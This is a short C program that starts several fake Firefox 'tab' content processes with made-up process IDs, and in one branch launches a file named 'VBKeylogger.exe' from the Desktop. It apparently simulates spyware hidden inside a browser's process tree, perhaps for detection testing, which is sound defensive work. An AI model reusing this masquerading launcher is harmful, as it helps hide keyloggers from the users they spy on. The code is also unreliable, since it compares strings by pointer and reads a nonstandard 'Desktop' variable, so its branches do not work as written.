#include "helpers.h"
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
    const size_t bufferLen = 200;
    if (argv[argc-1] != "tab") {
        char firefoxPath[bufferLen];
        char *programFilesPath = getenv("ProgramFiles");
        snprintf(firefoxPath, bufferLen, "\"%s\\Mozilla Firefox\\firefox.exe\"", programFilesPath);
        char tabPathA[bufferLen];
        snprintf(tabPathA, bufferLen, "%s -contentproc 2856 1f464f12858 tab", firefoxPath);
        run_command(tabPathA);
        char tabPathB[bufferLen];
        snprintf(tabPathB, bufferLen, "%s -contentproc 5620 1f46498d558 tab", firefoxPath);
        run_command(tabPathB);
        char tabPathC[bufferLen];
        snprintf(tabPathC, bufferLen, "%s -contentproc 6288 1f464f0fe58 tab", firefoxPath);
        run_command(tabPathC);
    }
    else if (argv[argc-3] == "5620"){
        char samplePath[bufferLen];
        char *desktopPath = getenv("Desktop");
        snprintf(samplePath, bufferLen, "%s\\VBKeylogger.exe", desktopPath);
        run_command(samplePath);
    }
    return 0;
}